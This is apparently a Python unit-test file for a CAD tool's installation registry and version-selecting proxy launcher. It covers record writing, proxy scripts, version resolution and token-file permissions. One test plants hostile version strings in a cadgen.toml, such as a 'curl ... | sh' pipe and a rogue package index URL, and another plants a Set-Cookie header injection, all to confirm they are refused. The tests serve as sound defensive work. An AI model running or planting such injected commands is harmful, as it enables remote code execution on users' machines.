"""The installations' registry and the ``cadgen`` command that runs them
(``cadgen._internal.installations``, ``cadgen._internal.proxy``).

Each test writes into temporary folders from fake environments; none touches ~/.local/bin or the
user's state folder, and no engine runs: the running engines the proxy asks are faked.
"""

from __future__ import annotations

import json
import os
import subprocess
import unittest
from pathlib import Path
from tempfile import TemporaryDirectory
from unittest import mock

from tests.python.support.paths import add_repo_path

add_repo_path("packages/cadgen/src")

from cadgen._internal import installations, proxy  # noqa: E402
from cadgen.engine.registry import Folder, Registry  # noqa: E402
from cadgen._internal import engine_host  # noqa: E402
from cadgen.mcp import host  # noqa: E402

POSIX = unittest.skipIf(os.name == "nt", "the proxy is an sh script on POSIX")


class Fixture(unittest.TestCase):
    def setUp(self) -> None:
        scratch = TemporaryDirectory()
        self.addCleanup(scratch.cleanup)
        self.root = Path(scratch.name).resolve()
        self.state = Folder(self.root / "state")

    def environment(self, name: str) -> tuple[str, str, str]:
        """A fake environment's console script, python and prefix."""
        scripts = self.root / name / "bin"
        scripts.mkdir(parents=True)
        console, python = scripts / "cadgen", scripts / "python"
        for path in (console, python):
            path.write_text("", encoding="utf-8")
        return str(console), str(python), str(self.root / name)

    def registered(self, version: str) -> dict:
        installations.register(version, self.environment(f"env-{version}"), self.state)
        (record,) = [found for found in installations.records(self.state) if found["version"] == version]
        return record


class RegistryTests(Fixture):
    def test_a_record_names_the_installation_and_is_rewritten_only_when_it_moves(self) -> None:
        found = self.environment("env")
        path, status = installations.register("1.2.3", found, self.state)
        self.assertEqual((Path(path), status), (self.root / "state/installations/1.2.3.json", installations.REGISTERED))
        record = json.loads(Path(path).read_text(encoding="utf-8"))
        self.assertEqual({key: record[key] for key in ("version", "cadgen", "python", "prefix")},
                         {"version": "1.2.3", "cadgen": found[0], "python": found[1], "prefix": found[2]})
        self.assertIn("registered", record)
        self.assertEqual(installations.register("1.2.3", found, self.state)[1], installations.OK)
        moved = self.environment("moved")  # the same version installed again elsewhere (a purged uv cache)
        self.assertEqual(installations.register("1.2.3", moved, self.state)[1], installations.REGISTERED)
        self.assertEqual(installations.records(self.state)[0]["python"], moved[1])

    def test_an_upgrade_in_place_takes_over_its_environment_s_record(self) -> None:
        found = self.environment("tool")
        installations.register("0.8.0", found, self.state)
        installations.register("0.8.1", found, self.state)  # the same environment, upgraded
        self.registered("0.7.0")
        self.assertEqual(sorted(record["version"] for record in installations.records(self.state)), ["0.7.0", "0.8.1"],
                         "0.8.0's code is gone from it: `cadgen +0.8.0` must not run 0.8.1")

    def test_prune_removes_only_records_whose_interpreter_is_gone(self) -> None:
        gone, live = self.registered("1.0.0"), self.registered("2.0.0")
        os.unlink(gone["python"])
        self.assertEqual(installations.prune(self.state), [gone["path"]])
        self.assertEqual([record["version"] for record in installations.records(self.state)], ["2.0.0"])
        self.assertTrue(Path(live["path"]).is_file())

    def test_a_source_tree_registers_nothing_unless_named(self) -> None:
        # These tests import cadgen from the checkout: the release's version is not theirs to register.
        with mock.patch.dict("os.environ", {installations.NAME_ENV: ""}):
            self.assertIsNone(installations.own_version())
        with mock.patch.dict("os.environ", {installations.NAME_ENV: "1.2.3-dev.4"}):
            self.assertEqual(installations.own_version(), "1.2.3-dev.4")

    def test_only_the_cad_apps_server_and_doctor_write(self) -> None:
        from cadgen import cli
        from cadgen.mcp import shim

        found = self.environment("env")
        named = {installations.NAME_ENV: "1.2.3", installations.DIR_ENV: str(self.root / "bin"),
                 "CADGEN_STATE_DIR": str(self.root / "state")}
        with mock.patch.dict("os.environ", named), mock.patch.object(installations, "targets", return_value=found):
            with mock.patch.object(cli, "_run", return_value=0), mock.patch.object(cli, "_tell"):
                self.assertEqual(cli._main(["status"]), 0)
            self.assertFalse((self.root / "bin").exists())
            self.assertEqual(installations.records(), [])
            shim.start()
            self.assertEqual([record["version"] for record in installations.records()], ["1.2.3"])
            self.assertEqual(installations.proxy_status(), installations.OK)

    def test_a_folder_it_cannot_write_is_skipped_silently(self) -> None:
        from cadgen.mcp import shim

        blocked = self.root / "a-file"
        blocked.write_text("", encoding="utf-8")
        path, status, error = installations.write_proxy(str(blocked / "bin"))
        self.assertTrue(error)
        named = {installations.NAME_ENV: "1.2.3", installations.DIR_ENV: str(blocked / "bin"),
                 "CADGEN_STATE_DIR": str(blocked / "state")}
        with mock.patch.dict("os.environ", named), mock.patch.object(installations, "targets",
                                                                     return_value=self.environment("env")):
            shim.start()  # the server says nothing and raises nothing
            (_, _, unregistered), (_, _, unwritten) = installations.setup("1.2.3")
        self.assertTrue(unregistered and unwritten)


class ProxyFileTests(Fixture):
    def test_the_proxy_is_written_once_and_a_file_not_cadgens_is_left_alone(self) -> None:
        where = str(self.root / "bin")
        self.assertEqual(installations.write_proxy(where, windows=False)[1:], (installations.MISSING, None))
        path = installations.proxy_path(where, windows=False)
        self.assertEqual(Path(path).read_text(encoding="utf-8"), installations.script(False))
        self.assertTrue(os.access(path, os.X_OK))
        self.assertEqual(installations.write_proxy(where, windows=False)[1], installations.OK)
        Path(path).write_text(installations.script(False).replace("exit 1", "exit 2"), encoding="utf-8")
        self.assertEqual(installations.write_proxy(where, windows=False)[1], installations.STALE)
        later = installations.script(False).replace(f"{installations.MARK}{installations.REVISION}",
                                                    f"{installations.MARK}{installations.REVISION + 1}")
        Path(path).write_text(later, encoding="utf-8")
        self.assertEqual(installations.write_proxy(where, windows=False)[1], installations.NEWER)
        self.assertEqual(Path(path).read_text(encoding="utf-8"), later)
        Path(path).write_text("#!/bin/sh\nexec uv-tool-cadgen\n", encoding="utf-8")  # a person's own
        self.assertEqual(installations.write_proxy(where, windows=False)[1], installations.FOREIGN)
        self.assertEqual(Path(path).read_text(encoding="utf-8"), "#!/bin/sh\nexec uv-tool-cadgen\n")

    def test_the_windows_proxy_is_a_cmd_with_the_same_marker(self) -> None:
        text = installations.script(True)
        self.assertIn(f"rem {installations.MARK}{installations.REVISION}\r\n", text)
        self.assertIn("-P -m cadgen._internal.proxy %*", text)
        installations.write_proxy(str(self.root / "bin"), windows=True)
        self.assertTrue((self.root / "bin" / "cadgen.cmd").is_file())

    def test_the_cmd_takes_the_python_from_its_record_line(self) -> None:
        # No Windows here to run it: for /f's split is simulated. With delims=" a run of quotes is
        # one delimiter and none starts the line, so the line's leading space is token 1.
        import re

        python = "C:\\Users\\a b\\AppData\\Local\\uv\\env\\Scripts\\python.exe"
        path, _status = installations.register("1.2.3", (python[:-10] + "cadgen.exe", python, "C:\\env"), self.state)
        text = installations.script(True)
        tokens, delimiter, needle = re.search(r'tokens\^=(\d+)\^ delims\^=\^(.) %%p in \(`findstr /c:"((?:\\"|[^"])*)" ',
                                              text).groups()
        needle = needle.replace('\\"', '"')  # findstr's escaped quote
        (line,) = [line for line in Path(path).read_text(encoding="utf-8").splitlines() if needle in line]
        fields = [field for field in line.split(delimiter) if field]
        found = fields[int(tokens) - 1]
        self.assertEqual(found.replace("\\\\", "\\"), python, "the cmd's !python:\\\\=\\! unescapes JSON's backslashes")
        self.assertIn("!python:\\\\=\\!", text)

    @POSIX
    def test_the_sh_runs_the_installation_registered_last_and_names_a_missing_version(self) -> None:
        where = str(self.root / "bin")
        installations.write_proxy(where, windows=False)
        proxy_file = installations.proxy_path(where, windows=False)
        environment = {"PATH": os.environ.get("PATH", ""), "HOME": str(self.root), "CADGEN_STATE_DIR": str(self.root / "state")}
        missing = subprocess.run([proxy_file, "+9.9.9", "status"], capture_output=True, text=True, env=environment)
        self.assertEqual(missing.returncode, 1)
        self.assertEqual(missing.stderr.strip(), proxy.NOT_INSTALLED.format(version="9.9.9"))
        for version in ("1.0.0", "2.0.0"):
            record = self.registered(version)
            Path(record["python"]).write_text(f'#!/bin/sh\necho "{version}" "$@"\n', encoding="utf-8")
            os.chmod(record["python"], 0o755)
        os.utime(self.root / "state/installations/2.0.0.json", (1, 1))  # 1.0.0 registered last
        ran = subprocess.run([proxy_file, "+2.0.0", "a b"], capture_output=True, text=True, env=environment,
                             cwd=self.root)
        self.assertEqual(ran.stdout, "1.0.0 -P -m cadgen._internal.proxy +2.0.0 a b\n")


    def test_the_windows_proxy_reads_the_python_a_record_names(self) -> None:
        # No Windows runner executes the cmd: its for /f is checked against the record's own line.
        # With delims set to a quote alone, cmd skips empty pieces and keeps the indent as one.
        import re

        record = self.registered("1.0.0")
        (line,) = [row for row in Path(record["path"]).read_text(encoding="utf-8").splitlines()
                   if '"python":' in row]
        (taken,) = re.findall(r"tokens\^=(\d+)\^ delims\^=\^\" %%p", installations.script(True))
        pieces = [piece for piece in line.split('"') if piece]
        self.assertEqual(pieces[int(taken) - 1].replace("\\\\", "\\"), record["python"])

    @POSIX
    def test_the_sh_passes_over_an_installation_whose_cadgen_is_gone(self) -> None:
        where = str(self.root / "bin")
        installations.write_proxy(where, windows=False)
        environment = {"PATH": os.environ.get("PATH", ""), "HOME": str(self.root), "CADGEN_STATE_DIR": str(self.root / "state")}
        for version in ("1.0.0", "2.0.0"):
            record = self.registered(version)
            Path(record["python"]).write_text(f'#!/bin/sh\necho "{version}"\n', encoding="utf-8")
            os.chmod(record["python"], 0o755)
        os.utime(self.root / "state/installations/1.0.0.json", (1, 1))  # 2.0.0 registered last...
        os.remove(record["cadgen"])  # ...and uninstalled from its environment: its python stays
        ran = subprocess.run([installations.proxy_path(where, windows=False), "status"], capture_output=True,
                             text=True, env=environment, cwd=self.root)
        self.assertEqual(ran.stdout, "1.0.0\n", ran.stderr)


class ResolutionTests(Fixture):
    def setUp(self) -> None:
        super().setUp()
        self.old, self.new, self.dev = self.registered("0.8.0"), self.registered("0.9.0"), self.registered("0.9.0-dev.20261024")
        self.records = installations.records(self.state)

    def choose(self, args: list[str], environ: dict | None = None, cwd: str | None = None,
               engines: list[dict] | None = None, shell: str | None = None) -> tuple[str, list[str]]:
        asked = []

        def running() -> list[dict]:
            asked.append(True)
            return engines or []

        version, rest = proxy.named(args, environ or {}, cwd or str(self.root))
        record = proxy.choose(version, self.records, running, shell)
        if version is not None:
            self.assertFalse(asked, "a version named asks no engine")
        return record["version"], rest

    def engine(self, record: dict, **hosts: int) -> dict:
        return {"ok": True, "prefix": record["prefix"], "hosts": {name.replace("_", " "): count for name, count in hosts.items()}}

    def test_a_the_first_argument_names_the_version(self) -> None:
        self.assertEqual(self.choose(["+0.8.0", "export", "a.xbf"], {"CADGEN_VERSION": "0.9.0"}), ("0.8.0", ["export", "a.xbf"]))

    def test_b_then_cadgen_version(self) -> None:
        (self.root / "proj").mkdir()
        (self.root / "proj" / "cadgen.toml").write_text('version = "0.9.0"\n', encoding="utf-8")
        self.assertEqual(self.choose(["status"], {"CADGEN_VERSION": "0.8.0"}, str(self.root / "proj")), ("0.8.0", ["status"]))

    def test_c_then_a_cadgen_toml_from_the_current_folder_up(self) -> None:
        deep = self.root / "proj" / "parts" / "deep"
        deep.mkdir(parents=True)
        (self.root / "proj" / "cadgen.toml").write_text('version = "0.8.0"\n', encoding="utf-8")
        (self.root / "proj" / "parts" / "cadgen.toml").write_text("[other]\nkey = 1\n", encoding="utf-8")  # says none
        self.assertEqual(self.choose(["status"], cwd=str(deep)), ("0.8.0", ["status"]))
        (self.root / "proj" / "parts" / "cadgen.toml").write_text("version = \n", encoding="utf-8")
        with self.assertRaisesRegex(proxy.Refused, r"^cadgen: .*cadgen\.toml: "):
            self.choose(["status"], cwd=str(deep))

    def test_d_then_the_running_engine_this_hosts_server_holds(self) -> None:
        engines = [self.engine(self.new, claude_code=1), self.engine(self.old, codex=2)]
        self.assertEqual(self.choose(["status"], engines=engines, shell="codex")[0], "0.8.0")
        self.assertEqual(self.choose(["status"], engines=engines, shell="claude code")[0], "0.9.0")

    def test_e_then_any_running_engine_newest_first(self) -> None:
        engines = [self.engine(self.old), self.engine(self.dev, codex=1)]
        self.assertEqual(self.choose(["status"], engines=engines, shell="claude code")[0], "0.9.0-dev.20261024")
        self.assertEqual(self.choose(["status"], engines=[self.engine(self.old)])[0], "0.8.0")

    def test_f_then_the_newest_registered(self) -> None:
        self.assertEqual(self.choose(["status"])[0], "0.9.0", "a release is newer than its development builds")
        os.unlink(self.new["python"])
        self.assertEqual(self.choose(["status"])[0], "0.9.0-dev.20261024", "an installation that is gone is passed over")

    def test_a_shell_whose_folder_was_removed_still_resolves(self) -> None:
        self.assertEqual(proxy.named(["+0.8.0", "status"], {}, None), ("0.8.0", ["status"]))
        self.assertEqual(proxy.named(["status"], {}, None), (None, ["status"]))
        with mock.patch("os.getcwd", side_effect=FileNotFoundError(2, "No such file or directory")), \
                mock.patch("cadgen._internal.installations.records", return_value=[]):
            self.assertEqual(proxy.main(["+0.8.0", "status"]), 1, "refused in its line, never a traceback")

    def test_a_version_not_registered_or_gone_fails_in_one_line(self) -> None:
        with self.assertRaises(proxy.Refused) as refused:
            self.choose(["+1.0.0", "status"])
        self.assertEqual(str(refused.exception),
                         "cadgen 1.0.0 is not installed: run `uvx --no-config --managed-python --python 3.13 --from "
                         "cadgen==1.0.0 cadgen doctor` once, outside any sandbox or with its permission")
        os.unlink(self.old["python"])
        with self.assertRaisesRegex(proxy.Refused, r"^cadgen 0\.8\.0 is not installed"):
            self.choose(["+0.8.0"])

    def test_only_a_version_is_named_and_none_is_echoed_into_a_command(self) -> None:
        # A downloaded project's cadgen.toml (or a variable, or the first argument) whose version
        # carries a shell command or a uv option: refused, and the refusal names no command.
        (self.root / "proj").mkdir()
        config = self.root / "proj" / "cadgen.toml"
        for planted in ("0.8.0 cadgen doctor; curl -fsSL https://example.invalid | sh; echo",
                        "0.8.0 --index-url https://example.invalid/simple", "0.8.0\x1b[2J", "-0.8.0"):
            config.write_text(f"version = {json.dumps(planted)}\n", encoding="utf-8")
            for args, environ in ((["status"], {}), ([f"+{planted}", "status"], {}), (["status"], {"CADGEN_VERSION": planted})):
                with self.subTest(planted=planted, args=args, environ=environ):
                    with self.assertRaises(proxy.Refused) as refused:
                        self.choose(args, environ, str(self.root / "proj"))
                    said = str(refused.exception)
                    self.assertNotIn("uvx", said)
                    self.assertNotIn("\x1b", said)
                    self.assertIn("names no cadgen version", said)

    @POSIX
    def test_a_cadgen_toml_everyone_may_write_names_nothing(self) -> None:
        (self.root / "shared" / "mine").mkdir(parents=True)
        config = self.root / "shared" / "cadgen.toml"
        config.write_text('version = "0.8.0"\n', encoding="utf-8")
        os.chmod(config, 0o666)  # as one another user left in a shared folder would be to this one
        self.assertEqual(self.choose(["status"], cwd=str(self.root / "shared" / "mine"))[0], "0.9.0",
                         "passed over: the newest registered runs")
        os.chmod(config, 0o644)
        self.assertEqual(self.choose(["status"], cwd=str(self.root / "shared" / "mine"))[0], "0.8.0")
        with mock.patch.object(proxy.os, "getuid", return_value=os.getuid() + 1):  # another user's file
            self.assertEqual(self.choose(["status"], cwd=str(self.root / "shared" / "mine"))[0], "0.9.0")

    def test_run_execs_the_installations_python_and_anything_else_its_cadgen(self) -> None:
        self.assertEqual(proxy.command(self.old, ["run", "model.py", "--force"]), [self.old["python"], "model.py", "--force"])
        self.assertEqual(proxy.command(self.old, ["export", "a.xbf"]), [self.old["cadgen"], "export", "a.xbf"])
        run = [self.old["python"], "model.py", "a"]
        with mock.patch.dict("os.environ", {"CADGEN_STATE_DIR": str(self.root / "state"), "CADGEN_VERSION": ""}), \
                mock.patch.object(proxy, "engines", return_value=[]), mock.patch.object(proxy.os, "execv") as execv, \
                mock.patch("subprocess.call", return_value=3) as call:
            code = proxy.main(["+0.8.0", "run", "model.py", "a"])
        if os.name == "nt":  # no exec on Windows: the installation's python is a child, its exit code the proxy's
            call.assert_called_once_with(run)
            self.assertEqual((code, execv.call_count), (3, 0))
        else:
            execv.assert_called_once_with(self.old["python"], run)
            self.assertEqual(call.call_count, 0)

    def test_the_shell_names_its_host(self) -> None:
        self.assertEqual(engine_host.shell({"CODEX_THREAD_ID": "t", "CLAUDECODE": "1"}), "codex")
        self.assertEqual(engine_host.shell({"CLAUDECODE": "1"}), "claude code")
        self.assertIsNone(engine_host.shell({}))
        self.assertEqual(host.family({"host": "codex app-server"}), "codex")
        self.assertEqual(host.family({"host": "claude code"}), "claude code")
        self.assertIsNone(host.family(None))


class TokenTests(unittest.TestCase):
    def test_the_page_token_is_one_file_the_users_alone(self) -> None:
        with TemporaryDirectory() as scratch:
            held = Registry(scratch)
            self.assertIsNone(held.token())
            held.put_token("t" * 43)
            self.assertEqual(held.token(), "t" * 43)
            path = Path(scratch) / "engines" / "token"
            if os.name != "nt":
                self.assertEqual(path.stat().st_mode & 0o777, 0o600)
            path.write_text("short\n", encoding="utf-8")
            self.assertIsNone(held.token(), "a token too short to guard anything is none")
            path.write_text("t" * 40 + "\r\nSet-Cookie: x=y\n", encoding="utf-8")
            self.assertIsNone(held.token(), "only a token's characters: it goes into a cookie")
            held.put_token("u" * 43)
            if os.name != "nt":
                os.chmod(path, 0o644)  # readable by others, as in a state folder others share
                self.assertIsNone(held.token(), "a token others can read guards nothing: a new one is made")
                os.chmod(path, 0o600)
                with mock.patch("os.getuid", return_value=os.getuid() + 1):
                    self.assertIsNone(held.token(), "another user's token file is not this user's token")
            self.assertEqual(held.token(), "u" * 43)


if __name__ == "__main__":
    unittest.main()
